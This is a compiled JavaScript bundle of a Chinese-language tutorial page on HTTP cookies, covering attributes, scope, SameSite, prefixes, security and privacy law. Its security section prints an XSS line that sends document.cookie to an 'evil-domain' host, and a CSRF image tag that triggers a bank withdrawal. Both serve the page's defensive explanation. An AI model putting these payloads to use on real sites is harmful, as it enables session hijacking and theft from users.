"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[183],{8431:function(e,t,o){o.r(t),o.d(t,{_frontmatter:function(){return l},default:function(){return p}});var n=o(358),i=(o(2983),o(4256)),a=["components"],l={title:"HTTP Cookie",slug:"http/cookies",tags:["http"]},k={_frontmatter:l};function p(e){var t=e.components,o=(0,n.Z)(e,a);return(0,i.kt)("wrapper",Object.assign({},k,o,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。"),(0,i.kt)("p",null,"Cookie 主要用于以下三个方面："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）"),(0,i.kt)("li",{parentName:"ul"},"个性化设置（如用户自定义设置、主题等）"),(0,i.kt)("li",{parentName:"ul"},"浏览器行为跟踪（如跟踪分析用户行为等）")),(0,i.kt)("p",null,"Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 要查看 Cookie 存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用",(0,i.kt)("strong",{parentName:"p"},"存储查看"),"（Storage Inspector ）功能，并在存储树上选中",(0,i.kt)("strong",{parentName:"p"},"Cookie"),"。")),(0,i.kt)("h2",null,"创建 Cookie"),(0,i.kt)("p",null,'当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 "Set-Cookie" 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 ("Cookie") 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。'),(0,i.kt)("h3",null,(0,i.kt)("inlineCode",{parentName:"h3"},"Set-Cookie 响应头部"),"和",(0,i.kt)("inlineCode",{parentName:"h3"},"Cookie 请求头部")),(0,i.kt)("p",null,'服务器使用 ("Set-Cookie") 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-plain"},"Set-Cookie: <cookie 名>=<cookie 值>\n")),(0,i.kt)("p",null,"服务器通过该头部告知客户端保存 Cookie 信息。"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-plain"},"HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[页面内容]\n")),(0,i.kt)("p",null,'现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 ("Cookie") 请求头部再发送给服务器。'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-plain"},"GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 如何在以下几种服务端程序中设置 ",(0,i.kt)("inlineCode",{parentName:"p"},"Set-Cookie")," 响应头信息："),(0,i.kt)("ul",{parentName:"blockquote"},(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://secure.php.net/manual/en/function.setcookie.php"},"PHP")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value"},"Node.JS")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://docs.python.org/3/library/http.cookies.html"},"Python")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html"},"Ruby on Rails")))),(0,i.kt)("h3",null,"定义 Cookie 的生命周期"),(0,i.kt)("p",null,"Cookie 的生命周期可以通过两种方式定义："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（",(0,i.kt)("inlineCode",{parentName:"li"},"Expires"),"）或者有效期（",(0,i.kt)("inlineCode",{parentName:"li"},"Max-Age"),"）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。"),(0,i.kt)("li",{parentName:"ul"},"持久性 Cookie 的生命周期取决于过期时间（",(0,i.kt)("inlineCode",{parentName:"li"},"Expires"),"）或有效期（",(0,i.kt)("inlineCode",{parentName:"li"},"Max-Age"),"）指定的一段时间。")),(0,i.kt)("p",null,"例如："),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-plain"},"Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。")),(0,i.kt)("p",null,"如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止会话固定攻击（session fixation attacks），在该攻击中第三方可以重用用户的会话。"),(0,i.kt)("h3",null,"限制访问 Cookie"),(0,i.kt)("p",null,"有两种方法可以确保 ",(0,i.kt)("inlineCode",{parentName:"p"},"Cookie")," 被安全发送，并且不会被意外的参与者或脚本访问：",(0,i.kt)("inlineCode",{parentName:"p"},"Secure")," 属性和",(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," 属性。"),(0,i.kt)("p",null,"标记为 ",(0,i.kt)("inlineCode",{parentName:"p"},"Secure"),' 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 "man-in-the-middle" 攻击者的攻击。但即便设置了 ',(0,i.kt)("inlineCode",{parentName:"p"},"Secure")," 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，",(0,i.kt)("inlineCode",{parentName:"p"},"Secure")," 标记也无法提供确实的安全保障，例如，可以访问客户端硬盘的人可以读取它。"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 从 Chrome 52 和 Firefox 52 开始，不安全的站点（",(0,i.kt)("inlineCode",{parentName:"p"},"http:"),"）无法使用 Cookie 的 ",(0,i.kt)("inlineCode",{parentName:"p"},"Secure")," 标记。")),(0,i.kt)("p",null,'JavaScript "Document.cookie" API 无法访问带有 ',(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," 属性的 cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 ",(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," 属性。此预防措施有助于缓解跨站点脚本（XSS）攻击。"),(0,i.kt)("p",null,"示例："),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-plain"},"Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")),(0,i.kt)("h3",null,"Cookie 的作用域"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"Domain")," 和 ",(0,i.kt)("inlineCode",{parentName:"p"},"Path")," 标识定义了 Cookie 的",(0,i.kt)("em",{parentName:"p"},"作用域："),"即允许 Cookie 应该发送给哪些 URL。"),(0,i.kt)("h4",null,"Domain 属性"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"Domain"),' 指定了哪些主机可以接受 Cookie。如果不指定，默认为 ("origin")，',(0,i.kt)("strong",{parentName:"p"},"不包含子域名"),"。如果指定了",(0,i.kt)("inlineCode",{parentName:"p"},"Domain"),"，则一般包含子域名。因此，指定 ",(0,i.kt)("inlineCode",{parentName:"p"},"Domain")," 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。"),(0,i.kt)("p",null,"例如，如果设置 ",(0,i.kt)("inlineCode",{parentName:"p"},"Domain=mozilla.org"),"，则 Cookie 也包含在子域名中（如",(0,i.kt)("inlineCode",{parentName:"p"},"developer.mozilla.org"),"）。"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 当前大多数浏览器遵循 ",(0,i.kt)("a",{parentName:"p",href:"http://tools.ietf.org/html/rfc6265"},"RFC 6265"),"，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：",(0,i.kt)("inlineCode",{parentName:"p"},"Domain=.mozilla.org"))),(0,i.kt)("h4",null,"Path 属性"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"Path")," 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 ",(0,i.kt)("inlineCode",{parentName:"p"},"%x2F"),' ("/") 作为路径分隔符，子路径也会被匹配。'),(0,i.kt)("p",null,"例如，设置 ",(0,i.kt)("inlineCode",{parentName:"p"},"Path=/docs"),"，则以下地址都会匹配："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"/docs")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"/docs/Web/")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"/docs/Web/HTTP"))),(0,i.kt)("h4",null,"SameSite attribute"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"SameSite"),' Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中 ("Site") 由可注册域定义），从而可以阻止跨站请求伪造攻击("CSRF")。'),(0,i.kt)("p",null,"SameSite cookies 是相对较新的一个字段，所有主流浏览器都已经得到支持。"),(0,i.kt)("p",null,"下面是例子："),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"Set-Cookie: key=value; SameSite=Strict\n")),(0,i.kt)("p",null,"SameSite 可以有下面三种值："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},(0,i.kt)("inlineCode",{parentName:"strong"},"None")),"。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},(0,i.kt)("inlineCode",{parentName:"strong"},"Strict")),"。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},(0,i.kt)("inlineCode",{parentName:"strong"},"Lax")),"。与 ",(0,i.kt)("strong",{parentName:"li"},(0,i.kt)("inlineCode",{parentName:"strong"},"Strict"))," 类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。大多数主流浏览器正在将 ",(0,i.kt)("a",{parentName:"p",href:"https://www.chromestatus.com/feature/5088147346030592"},"SameSite 的默认值迁移至 Lax"),"。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。")),(0,i.kt)("h4",null,"Cookie prefixes"),(0,i.kt)("p",null,"cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。"),(0,i.kt)("p",null,"子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅会话劫持（ session fixation）。"),(0,i.kt)("p",null,"但是，作为",(0,i.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/Defense_in_depth_(computing)"},"深度防御措施"),"，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"__Host-"),(0,i.kt)("ul",{parentName:"li"},(0,i.kt)("li",{parentName:"ul"},": 如果 cookie 名称具有此前缀，则仅当它也用 ",(0,i.kt)("inlineCode",{parentName:"li"},"Secure")," 属性标记，是从安全来源发送的，不包括 ",(0,i.kt)("inlineCode",{parentName:"li"},"Domain")," 属性，并将 ",(0,i.kt)("inlineCode",{parentName:"li"},"Path")," 属性设置为 ",(0,i.kt)("inlineCode",{parentName:"li"},"/"),' 时，它才在 ("Set-Cookie") 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。'))),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"__Secure-"),(0,i.kt)("ul",{parentName:"li"},(0,i.kt)("li",{parentName:"ul"},": 如果 cookie 名称具有此前缀，则仅当它也用 ",(0,i.kt)("inlineCode",{parentName:"li"},"Secure"),' 属性标记，是从安全来源发送的，它才在 ("Set-Cookie") 标头中接受。该前缀限制要弱于 ',(0,i.kt)("inlineCode",{parentName:"li"},"__Host-")," 前缀。")))),(0,i.kt)("p",null,"带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 在应用程序服务器上，Web 应用程序",(0,i.kt)("strong",{parentName:"p"},"必须"),'检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 ("Cookie") 标头中发送前缀之前，',(0,i.kt)("strong",{parentName:"p"},"不会"),"从 cookie 中剥离前缀。")),(0,i.kt)("h4",null,"JavaScript 通过 Document.cookie 访问 Cookie"),(0,i.kt)("p",null,'通过 ("Document.cookie") 属性可创建新的 Cookie，也可通过该属性访问非',(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly"),"标记的 Cookie。"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"document.cookie = 'yummy_cookie=choco';\ndocument.cookie = 'tasty_cookie=strawberry';\nconsole.log(document.cookie);\n// logs \"yummy_cookie=choco; tasty_cookie=strawberry\"\n")),(0,i.kt)("p",null,"通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。"),(0,i.kt)("p",null,"请留意在安全章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。"),(0,i.kt)("h2",null,"安全"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"备注：")," 信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。当机器处于不安全环境时，切记",(0,i.kt)("em",{parentName:"p"},"不能"),"通过 HTTP Cookie 存储、传输敏感信息。")),(0,i.kt)("p",null,"缓解涉及 Cookie 的攻击的方法："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"使用 ",(0,i.kt)("inlineCode",{parentName:"li"},"HttpOnly")," 属性可防止通过 JavaScript 访问 cookie 值。"),(0,i.kt)("li",{parentName:"ul"},"用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 ",(0,i.kt)("inlineCode",{parentName:"li"},"SameSite")," 属性设置为",(0,i.kt)("inlineCode",{parentName:"li"},"Strict")," 或 ",(0,i.kt)("inlineCode",{parentName:"li"},"Lax"),"。（请参见上方的 SameSite Cookie。）在支持 SameSite 的浏览器中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。")),(0,i.kt)("h3",null,"会话劫持和 XSS"),(0,i.kt)("p",null,'在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 ("XSS") 攻击。'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-js"},"new Image().src =\n  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;\n")),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。"),(0,i.kt)("h3",null,"跨站请求伪造（CSRF）"),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery"},"维基百科"),'已经给了一个比较好的 ("CSRF") 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},'<img\n  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"\n/>\n')),(0,i.kt)("p",null,"当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},'对用户输入进行过滤来阻止 ("XSS")；'),(0,i.kt)("li",{parentName:"ul"},"任何敏感操作都需要确认；"),(0,i.kt)("li",{parentName:"ul"},"用于敏感信息的 Cookie 只能拥有较短的生命周期；"),(0,i.kt)("li",{parentName:"ul"},"更多方法可以查看",(0,i.kt)("a",{parentName:"li",href:"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"},"OWASP CSRF prevention cheat sheet"),"。")),(0,i.kt)("h2",null,"跟踪和隐私"),(0,i.kt)("h3",null,"第三方 Cookie"),(0,i.kt)("p",null,"Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为",(0,i.kt)("em",{parentName:"p"},"第一方 cookie（ first-party cookie）"),"。如果域不同，则它是",(0,i.kt)("em",{parentName:"p"},"第三方 cookie（third-party cookie）"),"。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，",(0,i.kt)("a",{parentName:"p",href:"https://policies.google.com/technologies/types"},"types of cookies used by Google"),"。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方 cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。"),(0,i.kt)("p",null,"如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对 Cookie 制订了相应的法规，可以查看维基百科上例子",(0,i.kt)("a",{parentName:"p",href:"https://wikimediafoundation.org/wiki/Cookie_statement"},"cookie statement"),"。"),(0,i.kt)("h3",null,"Cookie 相关规定"),(0,i.kt)("p",null,"涉及使用 Cookie 的法律或法规包括："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"欧盟通用数据隐私法规（GDPR）"),(0,i.kt)("li",{parentName:"ul"},"欧盟的《隐私权指令》"),(0,i.kt)("li",{parentName:"ul"},"加州消费者隐私法")),(0,i.kt)("p",null,"这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过 2500 万美元的实体。）"),(0,i.kt)("p",null,"这些法规包括以下要求："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"向用户表明您的站点使用 cookie。"),(0,i.kt)("li",{parentName:"ul"},"允许用户选择不接收某些或所 ​​ 有 cookie。"),(0,i.kt)("li",{parentName:"ul"},"允许用户在不接收 Cookie 的情况下使用大部分服务。")),(0,i.kt)("p",null,'可能还存在其他法规来管理您当地的 Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。'),(0,i.kt)("p",null,"可以通过",(0,i.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive"},"维基百科的相关内容"),"获取最新的各国法律和更精确的信息。"),(0,i.kt)("h4",null,"禁止追踪 Do-Not-Track"),(0,i.kt)("p",null,'虽然并没有法律或者技术手段强制要求使用 ("DNT")，但是通过("DNT") 可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。查看("DNT") 以获取更多信息。'),(0,i.kt)("h4",null,"欧盟 Cookie 指令"),(0,i.kt)("p",null,"关于 Cookie，欧盟已经在",(0,i.kt)("a",{parentName:"p",href:"http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136"},"2009/136/EC 指令"),"中提了相关要求，该指令已于 2011 年 5 月 25 日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。"),(0,i.kt)("p",null,"该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。"),(0,i.kt)("h3",null,"僵尸 Cookie 和删不掉的 Cookie"),(0,i.kt)("p",null,"Cookie 的一个极端使用例子是僵尸 Cookie（或称之为“删不掉的 Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 Web storage API、Flash 本地共享对象或者其他技术手段来达到的。相关内容可以看："),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://github.com/samyk/evercookie"},"Evercookie by Samy Kamkar")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/Zombie_cookie"},"在维基百科上查看僵尸 Cookie"))),(0,i.kt)("h2",null,"在浏览器中存储信息的其他方式"),(0,i.kt)("p",null,"在浏览器中存储数据的另一种方法是 Web Storage API。window.sessionStorage 和 window.localStorage 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。"),(0,i.kt)("p",null,"可以使用 IndexedDB API 或基于它构建的库来存储更多结构化的数据。"),(0,i.kt)("h2",null,"了解更多"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},'("Set-Cookie")'),(0,i.kt)("li",{parentName:"ul"},'("Cookie")'),(0,i.kt)("li",{parentName:"ul"},'("Document.cookie")'),(0,i.kt)("li",{parentName:"ul"},'("Navigator.cookieEnabled")'),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://tools.ietf.org/html/rfc6265"},"Cookie specification: RFC 6265")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/"},"Nicholas Zakas article on cookies")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://www.nczonline.net/blog/2009/05/12/cookies-and-security/"},"Nicholas Zakas article on cookies and security")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/HTTP_cookie"},"HTTP cookie on Wikipedia"))))}p.isMDXComponent=!0}}]);
//# sourceMappingURL=component---src-pages-http-cookies-mdx-50ca775b66091450107f.js.map